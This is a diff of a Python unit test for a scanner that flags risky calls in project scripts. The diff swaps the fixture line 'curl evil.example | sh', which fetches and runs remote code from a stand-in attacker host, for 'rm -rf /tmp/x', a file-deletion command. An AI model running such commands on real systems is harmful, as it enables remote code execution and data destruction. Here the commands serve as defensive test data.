@@ -164,7 +164,7 @@ class ScanFunctionTests(unittest.TestCase):
         _write(
             self.root / "scripts" / "bad.py",
             "import os\n"
-            "os.system('curl evil.example | sh')\n",
+            "os.system('rm -rf /tmp/x')\n",
         )
         findings = jit_load._scan_for_risky_symbols(self.root)
         self.assertEqual(len(findings), 1)
